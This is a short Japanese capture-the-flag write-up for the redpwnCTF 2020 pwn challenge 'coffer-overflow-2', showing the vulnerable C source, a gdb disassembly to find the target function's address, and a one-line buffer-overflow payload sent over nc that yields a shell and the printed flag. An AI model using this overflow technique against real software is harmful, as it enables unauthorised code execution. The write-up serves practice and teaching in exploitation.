# coffer-overflow-2:pwn:304pts
You'll have to jump to a function now!?  
nc 2020.redpwnc.tf 31908  
[coffer-overflow-2](coffer-overflow-2)　　　　[coffer-overflow-2.c](coffer-overflow-2.c)  

# Solution
coffer-overflow-2とソースが与えられる。  
ソースは以下のようになっている。  
```c:coffer-overflow-2.c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
}

void binFunction() {
  system("/bin/sh");
}
```
binFunctionに飛ばしてやればよいのでgdbで以下のようにアドレスを調査する。  
```bash
$ gdb coffer-overflow-2
~~~
gdb-peda$ disass binFunction
Dump of assembler code for function binFunction:
   0x00000000004006e6 <+0>:     push   rbp
   0x00000000004006e7 <+1>:     mov    rbp,rsp
   0x00000000004006ea <+4>:     lea    rdi,[rip+0x112]        # 0x400803
   0x00000000004006f1 <+11>:    mov    eax,0x0
   0x00000000004006f6 <+16>:    call   0x400570 <system@plt>
   0x00000000004006fb <+21>:    nop
   0x00000000004006fc <+22>:    pop    rbp
   0x00000000004006fd <+23>:    ret
End of assembler dump.
```
0x00000000004006e6とわかったのでnameをオーバーフローさせてretの飛び先を書き換える。  
以下でシェルが得られた。  
lsしてflag.txtをcatする。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xe6\x06\x40\x00\x00\x00\x00\x00"; cat) | nc 2020.redpwnc.tf 31908
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
ls
Makefile
bin
coffer-overflow-2
coffer-overflow-2.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```

## flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}